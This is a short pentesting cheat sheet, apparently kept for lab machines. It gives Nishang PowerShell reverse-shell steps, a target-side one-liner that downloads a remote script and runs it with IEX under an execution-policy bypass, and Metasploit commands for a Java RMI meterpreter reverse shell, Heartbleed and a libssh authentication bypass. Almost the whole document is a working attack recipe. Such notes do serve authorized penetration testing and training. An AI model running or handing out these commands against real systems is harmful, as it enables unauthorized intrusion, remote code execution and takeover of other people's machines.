# Nishang
```
Description: Pentesting, has support for an ICMP reverse shell

# Clone Nishang repo
git clone https://github.com/samratashok/nishang
cd nishang/Shells

# Edit Invoke-PowerShellTcp.ps1 and append this line at the end
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 9001

# Start a web server to host the script
⭐python3 -m http.server 8000

# Start a Netcat listener (with rlwrap for better usability)
rlwrap nc -lnvp 9001
```

# On Target Machine
```
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.6:8000/Invoke-PowerShellTcp.ps1')"
```

# Java RMI Exploit
```
Metasploit Module: exploit/multi/misc/java_rmi_server

msfconsole
use exploit/multi/misc/java_rmi_server
set RHOSTS 10.10.10.125
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 10.10.14.6
exploit
```

# Heartbleed Exploit
```
Metasploit Module: auxiliary/scanner/ssl/openssl_heartbleed

msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 10.10.10.125
set VERBOSE true
run
```

# libssh Authentication Bypass
```
Metasploit Module: auxiliary/scanner/ssh/libssh_auth_bypass

msfconsole
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS 10.10.10.125
set RPORT 22
set TARGETURI /
set spawn_pty true
run
```

## Back to README.md
[BACK](/README.md)